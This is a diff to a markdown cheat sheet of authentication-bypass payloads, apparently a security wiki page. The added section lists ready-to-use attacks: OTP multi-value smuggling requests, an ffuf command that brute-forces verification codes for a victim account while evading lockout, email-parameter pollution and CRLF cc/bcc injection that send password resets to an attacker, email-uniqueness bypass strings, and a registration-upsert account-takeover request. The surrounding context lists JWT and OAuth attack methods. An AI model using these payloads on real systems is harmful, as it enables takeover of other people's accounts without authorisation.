@@ -2,9 +2,9 @@
 title: "Payloads: Authentication Bypass"
 type: payloads
 tags: [payloads, authentication, bypass, 2fa, web]
-sources: []
+sources: [hacktricks-web]
 date_created: 2026-06-16
-date_updated: 2026-06-16
+date_updated: 2026-07-14
 ---
 
 # Payloads: Authentication Bypass
@@ -51,6 +51,34 @@ token: guessable/sequential/no-expiry/returned-in-JSON
 JWT: alg:none ; weak HS256 secret crack ; kid path/SQLi ; jku/x5u SSRF   (see [[jwt]])
 OAuth redirect_uri + SAML XSW -> [[oauth-saml]]
 ```
+
+## OTP multi-value smuggling + email param pollution
+OTP/verification multi-value smuggling (backend verifies if ANY submitted code matches):
+```
+code=000000&code=123456
+{"code":["000000","123456"]}
+otp=000000&one_time_code=123456
+code=000000,123456        code=000000|123456
+```
+Parallel guessing to beat sequential lockout (Turbo Intruder, 30 conns), plus IP/header rotation:
+```bash
+ffuf -w codes.txt -u https://t/api/verify -X POST -H 'Content-Type: application/json' \
+  -d '{"email":"victim@x.com","code":"FUZZ"}' -fr 'Invalid|Too many attempts' -mc all
+```
+Password-reset / change email via email-parameter injection (send to attacker too):
+```
+email=victim@mail.com&email=hacker@mail.com
+{"email":["victim@mail.com","hacker@mail.com"]}
+email=victim@mail.com%0A%0Dcc:hacker@mail.com
+email=victim@mail.com%0A%0Dbcc:hacker@mail.com
+email=victim@mail.com,hacker@mail.com     email=victim@mail.com|hacker@mail.com
+```
+Duplicate-registration / uniqueness bypass:
+```
+victim+1@gmail.com   v.ic.tim@gmail.com   Victim@x.com(case)   test@test.com<space>
+victim@gmail.com@attacker.com   victim@attacker.com@gmail.com   victim%00@x.com   victim­@x.com
+```
+Registration-as-reset upsert ATO: `POST /.../doRegistrationEntries {"email":"victim@x.com","password":"New@1"}`.
 
 ## Real-world
 `X-Original-URL`/`X-Custom-IP-Authorization` ACL bypass, response-flag tampering, OTP no-rate-limit, and reset poisoning are recurring high-bounty ATOs.
